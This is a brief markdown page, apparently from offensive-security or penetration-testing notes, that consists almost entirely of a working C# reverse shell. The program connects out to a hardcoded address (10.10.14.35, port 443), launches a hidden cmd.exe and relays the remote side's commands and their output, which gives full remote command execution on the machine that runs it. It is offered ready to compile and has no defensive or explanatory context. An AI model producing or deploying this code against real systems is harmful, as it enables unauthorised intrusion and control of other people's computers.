# C# example - Run

C# Reverse shell

```csharp
// mcs ReverseShell.cs

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ReverseShell
{
    public class Run
    {
        public Run()
        {
            string ipAddress = "10.10.14.35";
            int port = 443;

            Connect(ipAddress, port);
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("Start Reverse Shell....");
            Run r = new Run();
        }

        public static void Connect(string ipAddress, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient(ipAddress, port))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            using (StreamWriter writer = new StreamWriter(stream))
                            {
                                Process process = new Process();
                                process.StartInfo.FileName = "cmd.exe";
                                process.StartInfo.UseShellExecute = false;
                                process.StartInfo.RedirectStandardInput = true;
                                process.StartInfo.RedirectStandardOutput = true;
                                process.StartInfo.CreateNoWindow = true;

                                process.OutputDataReceived += (sender, e) =>
                                {
                                    writer.WriteLine(e.Data);
                                    writer.Flush();
                                };

                                process.Start();

                                process.BeginOutputReadLine();

                                string command;
                                while ((command = reader.ReadLine()) != null)
                                {
                                    process.StandardInput.WriteLine(command);
                                    process.StandardInput.Flush();
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
        }
    }
}
```
